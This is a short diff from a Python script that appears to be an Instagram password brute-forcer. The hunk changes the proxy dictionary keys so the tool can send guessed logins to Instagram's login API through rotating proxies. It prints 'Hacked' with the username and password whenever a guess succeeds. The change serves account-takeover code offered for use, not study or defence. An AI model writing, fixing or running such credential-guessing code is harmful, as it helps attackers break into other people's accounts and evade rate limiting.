@@ -93,7 +93,7 @@ class randoomPas:
 				'_csrftoken':'missing', 
 				'login_attempt_countn':'0'}
 			try:
-				PROXY = {"https":run,"http":run}
+				PROXY = {"https://":run,"http://":run}
 				get = sent.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies=PROXY, allow_redirects=True)
 				if login in get.text:
 					vv1ck(grn+f'[+] Hacked >> {self.user}:{pess}')
